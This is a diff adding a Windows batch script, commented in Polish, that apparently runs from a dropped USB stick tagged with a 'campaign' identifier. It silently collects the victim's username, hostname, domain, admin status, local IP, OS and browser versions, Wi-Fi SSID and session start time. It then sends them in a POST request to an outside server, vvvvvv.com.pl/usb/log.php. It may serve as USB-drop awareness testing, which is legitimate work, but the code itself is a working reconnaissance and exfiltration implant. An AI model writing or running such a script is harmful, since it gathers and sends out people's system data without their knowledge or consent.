@@ -1,0 +1,61 @@
+@echo off
+setlocal ENABLEEXTENSIONS ENABLEDELAYEDEXPANSION
+
+REM === Identyfikator nośnika / kampanii ===
+set "RID=usb01-1"
+
+REM === Podstawowe dane systemowe ===
+set "TIMESTAMP=%DATE%_%TIME%"
+set "USER=%USERNAME%"
+set "HOST=%COMPUTERNAME%"
+set "DOMAIN=%USERDOMAIN%"
+set "ADMIN=user"
+set "IP=brak"
+set "OS=brak"
+set "BROWSER=brak"
+set "SSID=brak"
+set "SESDUR=brak"
+
+REM === Detekcja uprawnień administratora ===
+whoami /groups | find "S-1-5-32-544" >nul && set "ADMIN=admin"
+
+REM === IP lokalne w sieci prywatnej ===
+for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /C:"IPv4"') do (
+    set "ipraw=%%a"
+    set "ipraw=!ipraw: =!"
+    echo !ipraw! | findstr /C:"192.168." >nul && set "IP=!ipraw!"
+)
+
+REM === Wersja systemu operacyjnego ===
+for /f "tokens=*" %%a in ('ver') do (
+    set "OS=%%a"
+)
+
+REM === Detekcja przeglądarek (Edge / Chrome) ===
+reg query "HKLM\Software\Microsoft\Edge\BLBeacon" /v version >nul 2>&1 && (
+    for /f "tokens=3" %%v in ('reg query "HKLM\Software\Microsoft\Edge\BLBeacon" /v version') do set "BROWSER=Edge %%v"
+)
+reg query "HKLM\Software\Google\Chrome\BLBeacon" /v version >nul 2>&1 && (
+    for /f "tokens=3" %%v in ('reg query "HKLM\Software\Google\Chrome\BLBeacon" /v version') do set "BROWSER=Chrome %%v"
+)
+
+REM === Nazwa sieci Wi-Fi (SSID) ===
+for /f "tokens=2 delims=:" %%a in ('netsh wlan show interfaces ^| findstr /i "SSID" ^| findstr /v "BSSID"') do (
+    set "SSID=%%a"
+    set "SSID=!SSID: =!"
+)
+
+REM === Uptime systemu (start sesji) ===
+for /f "tokens=2,* delims= " %%a in ('net stats workstation ^| findstr /C:"Statystyka od"') do (
+    set "SESDUR=%%a %%b"
+)
+
+REM === Kompresja danych jako CSV-linia ===
+set "LINE=%RID%,%TIMESTAMP%,%USER%,%HOST%,%IP%,%OS%,%DOMAIN%,%ADMIN%,%BROWSER%,%SSID%,%SESDUR%"
+
+REM === Wysłanie na serwer ===
+curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" ^
+     -d "data=%LINE%" ^
+     https://vvvvvv.com.pl/usb/log.php
+
+exit
